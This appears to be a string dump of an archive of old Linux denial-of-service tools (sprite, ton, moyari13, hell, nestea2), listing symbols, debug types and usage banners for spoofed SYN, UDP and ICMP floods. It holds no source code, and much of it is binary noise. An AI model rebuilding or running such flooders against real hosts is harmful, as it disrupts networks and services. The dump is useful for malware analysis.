            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "stealth.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "bcopy@@GLIBC_2.0",
            "echo_connect",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/sprite",
            "0100755",
            "0000000",
            "0000000",
            "00000021577",
            "07071421613",
            "013401",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "printf",
            "random",
            "_DYNAMIC",
            "memcpy",
            "_IO_stderr_",
            "perror",
            "malloc",
            "socket",
            "__environ",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "__fpu_control",
            "rand",
            "signal",
            "htonl",
            "sendto",
            "gettimeofday",
            "memset",
            "time",
            "gethostbyname",
            "_fini",
            "sprintf",
            "atexit",
            "srandom",
            "_GLOBAL_OFFSET_TABLE_",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "strlen",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "PW[&",
            "WVSU",
            "e[^_Uh",
            "6Uh?",
            "P Re",
            "f]fE9",
            "M@eM",
            "fEfE",
            "fEPG",
            "MPE\u0300eeeeeeM e?h",
            "fEfE",
            "_fEj",
            "EPEPL",
            "6Uh ",
            "]+]\u0109]}",
            "E\u0109EE9Es",
            ")\u04c9]=",
            "]\u070bU\u0709\u0449",
            "]\u060bU\u0609\u0449",
            ")\u04c9]\u060bEPEPEPEPh",
            "E9E}",
            "EPEPEP",
            "E\u070d6EE{",
            "\u0403;u[",
            "[JSignal Caught. Exiting Cleanly.",
            "[JSegmentation Violation Caught. Exiting Cleanly.",
            "Unknown host %s",
            "Error sending syn packet.",
            "### sprite v1.0 by sinkhole ###",
            "Usage: %s srcaddr dstaddr low high clones",
            "     srcaddr - the spoof, if it is 0 it will be random",
            "     dstaddr - the target of the attack",
            "     low     - start port, ex: 1",
            "     high    - end port, ex: 65535",
            "     clones  - number of packets to send at once",
            "### Remember, image is nothing, bandwidth is everything! ###",
            "socket (raw)",
            "socket",
            "%i.%i.%i.%i",
            "High port must be greater than Low port.",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "GCC: (GNU) 2.7.2.1",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "crtstuff.c",
            "gcc2_compiled.",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "init_dummy",
            "force_to_data",
            "__DTOR_END__",
            "crt0.S",
            "done",
            "__do_global_dtors_aux",
            "__DTOR_LIST__",
            "fini_dummy",
            "__CTOR_LIST__",
            "sprite.c",
            "send_tcp_segment",
            "srcport",
            "printf",
            "random",
            "ip_sum",
            "_DYNAMIC",
            "_etext",
            "spoof_open",
            "memcpy",
            "_IO_stderr_",
            "perror",
            "sock",
            "malloc",
            "socket",
            "getaddr",
            "__environ",
            "sig_segv",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "send_seq",
            "__fpu_control",
            "_start",
            "rand",
            "signal",
            "htonl",
            "sendto",
            "curc",
            "___crt_dummy__",
            "ack_seq",
            "gettimeofday",
            "__bss_start",
            "memset",
            "main",
            "ssock",
            "time",
            "sig_exit",
            "gethostbyname",
            "_fini",
            "sprintf",
            "atexit",
            "srandom",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons",
            "flood",
            "exit",
            "atoi",
            "__setfpucw",
            "strlen",
            "init_signals",
            "datapool/bin/ton",
            "0100755",
            "0000000",
            "0000000",
            "00000021264",
            "07071423050",
            "012661",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "_DYNAMIC",
            "_GLOBAL_OFFSET_TABLE_",
            "_init",
            "_fini",
            "memcpy",
            "__environ",
            "malloc",
            "strcpy",
            "socket",
            "printf",
            "gethostbyname",
            "inet_addr",
            "perror",
            "sendto",
            "exit",
            "puts",
            "memset",
            "usleep",
            "environ",
            "optarg",
            "optind",
            "getopt",
            "strlen",
            "wait",
            "atexit",
            "atoi",
            "rand",
            "__libc_init",
            "__setfpucw",
            "__fpu_control",
            "htons",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "PT[t&",
            "WVSU",
            "e[^_]",
            "E}u\tt",
            "u*hi",
            "PEPEP",
            "\u0403;u]]",
            "ton 1.2",
            "\t\t\t%s Author - door/chrome  ",
            "\t\t\t         !98.12.14!    ",
            "bmx the lil boy",
            "This Copy Registered to: %s",
            "usage:",
            "%s [-s src] [-n num] [-p size] [-d port] [-o port] [-w wait] <dest>",
            "\t-s <src>    : a simple source",
            "\t-n <num>    : number of shit to send",
            "\t-p <size>   : Packet Size               [Default is 1024]",
            "\t-d <port>   : Open Port          [Default is  %.2d]",
            "\t-o <port>   : Source Port               [Default is  %.2d]",
            "\t-w <time>   : time between packets [Default is    1]",
            "\t<dest>      : destination ",
            "[*] Unable to resolve %s\t",
            "[*] Unable To resolve %s\t",
            "s:d:n:p:w:o:",
            "[*] Specify a target host, doof!",
            "[*] Agh!  Out of memory!",
            "malloc",
            "# Target Host          : %s",
            "Random",
            "# Source Host          : %s",
            "# Number               : Unliminted",
            "# Number               : %d",
            "# Packet Size          : %d",
            "# Wait Time            : %d",
            "# Dest Port            : %d",
            "# Source Port          : %d",
            "[*] Error sending Packet",
            "SendPacket",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "crtstuff.c",
            "gcc2_compiled.",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "init_dummy",
            "force_to_data",
            "__DTOR_END__",
            "crt0.S",
            "done",
            "__do_global_dtors_aux",
            "__DTOR_LIST__",
            "fini_dummy",
            "__CTOR_LIST__",
            "pepsi.c",
            "strcpy",
            "srcport",
            "dstport",
            "printf",
            "_DYNAMIC",
            "_etext",
            "usleep",
            "usage",
            "memcpy",
            "perror",
            "puts",
            "resolve",
            "malloc",
            "optarg",
            "socket",
            "__environ",
            "_init",
            "__libc_init",
            "parse_args",
            "environ",
            "inet_addr",
            "__fpu_control",
            "optind",
            "wait",
            "psize",
            "_start",
            "rand",
            "banner",
            "sendto",
            "___crt_dummy__",
            "__bss_start",
            "getopt",
            "memset",
            "main",
            "gethostbyname",
            "_fini",
            "atexit",
            "srchost",
            "resolvedest",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "numpacks",
            "strlen",
            "dstaddr",
            "target",
            "datapool/bin/moyari13",
            "0100755",
            "0000000",
            "0000000",
            "00000035061",
            "07100656636",
            "013540",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "memcpy",
            "perror",
            "malloc",
            "socket",
            "fflush",
            "bzero",
            "inet_addr",
            "__deregister_frame_info",
            "rand",
            "sendto",
            "memset",
            "srand",
            "time",
            "gethostbyname",
            "gethostname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh\u050d",
            "U1fE",
            "fE1fU",
            "]UPVSj(V",
            "EEEE",
            "Ej(j",
            "PE\u010bUM",
            "EE\u044bE\u010d",
            ")\u02cbE)\u060bU",
            "E\ubb50t&",
            "U\u0209Pj",
            "j(EPE",
            "P EEP",
            "e[^]U8",
            "1\u0248\u0449\u0449\u0689)\u0449PPP",
            "\u0403;u[]",
            "Usage : %s <dst addr> <count>",
            "Can't get this machine's hostname",
            "Unknown host %s.",
            "Getting raw send socket",
            "[ moyari13 ( TimeStump request) Attack ]",
            "sending...",
            "Done.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "moyari13.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "send_icmp_packet",
            "fflush@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "srand@@GLIBC_2.0",
            "gethostname@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/hell",
            "0100755",
            "0000000",
            "0000000",
            "00000017552",
            "07071420427",
            "013017",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "_DYNAMIC",
            "_GLOBAL_OFFSET_TABLE_",
            "_init",
            "_fini",
            "_IO_stderr_",
            "fprintf",
            "memcpy",
            "__environ",
            "socket",
            "printf",
            "gethostbyname",
            "perror",
            "gettimeofday",
            "sendto",
            "exit",
            "memset",
            "time",
            "usleep",
            "environ",
            "strlen",
            "srandom",
            "random",
            "atexit",
            "atoi",
            "rand",
            "__libc_init",
            "__setfpucw",
            "__fpu_control",
            "htonl",
            "htons",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "1UUUPSQ",
            "PT[t&",
            "WVSU",
            "e[^_]",
            "f]fE9",
            "M@eM",
            "fEfE",
            "fEh9H7(W",
            "eeee\u07c0e?h",
            "fEfE",
            "EPEPT",
            ":H7(",
            "}!h'",
            "}\"h4",
            "]+]]}",
            "EPhN",
            "EPha",
            "EEE9Es",
            "EPEPR",
            "EE{&",
            "\u0403;u]]",
            "Unknown host %s",
            "Error sending syn packet.",
            "!BaDBoY!  HeLL.C v1.0 - bY He||Angel",
            "He||Angel",
            "!BaDBoY!  Registered to: %s",
            "Usage: %s <dest> <low port> <high port>",
            "\t[dest]......: The IP to attack.",
            "\t[low port]..: The port to being attack on.",
            "\t[high port].: The port to end attack on.",
            "socket (raw)",
            "socket",
            "Dest Host....: %s",
            "Low Port.....: %d",
            "High Port....: %d",
            "[Bombing]",
            "Press CTRL + C to exit!",
            "[Done bombing the fuck!]",
            "Uhh....",
            "High port MUST be greater than Low port!",
            "You fewl!",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "GCC: (GNU) 2.7.2.3",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "crtstuff.c",
            "gcc2_compiled.",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "init_dummy",
            "force_to_data",
            "__DTOR_END__",
            "crt0.S",
            "done",
            "__do_global_dtors_aux",
            "__DTOR_LIST__",
            "fini_dummy",
            "__CTOR_LIST__",
            "hell.c",
            "send_tcp_segment",
            "srcport",
            "printf",
            "random",
            "ip_sum",
            "_DYNAMIC",
            "_etext",
            "usleep",
            "spoof_open",
            "memcpy",
            "_IO_stderr_",
            "perror",
            "sock",
            "socket",
            "getaddr",
            "__environ",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "send_seq",
            "__fpu_control",
            "_start",
            "rand",
            "htonl",
            "sendto",
            "___crt_dummy__",
            "ack_seq",
            "gettimeofday",
            "__bss_start",
            "memset",
            "main",
            "ssock",
            "time",
            "gethostbyname",
            "_fini",
            "atexit",
            "srandom",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons",
            "flood",
            "exit",
            "atoi",
            "__setfpucw",
            "strlen",
            "datapool/bin/nestea2",
            "0100755",
            "0000000",
            "0000000",
            "00000052367",
            "07100656641",
            "013441",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "random",
            "getopt_long",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "sscanf",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "sprintf",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "UdSE",
            "EPR }",
            "t$h ",
            "t#h`",
            "E}u\t",
            "Eqtpq",
            "ntNmst",
            "tt\"a",
            "fE[&",
            "fE;&",
            ")\u044bE)fEf}",
            "u7gE",
            ")\u044bE)fE\u0703}",
            "EE1fEPEP",
            "EE1fEPEPEP",
            "Pz EPh",
            "EPQ }",
            "E;E|",
            "F1fEP1fEPEPEPEP",
            "U@VSE",
            "fEfUE",
            "fEfE\u078bE",
            "EEEh",
            "EPEP",
            "EPE@P",
            "1fEP",
            "1fEP",
            "U\u0709Pj",
            "j&EPE",
            "P u2hZ",
            "EPEP",
            "EPE@P%",
            "1fEPw",
            "1fEPY",
            "U\u0709Pj",
            "P6 u0hZ",
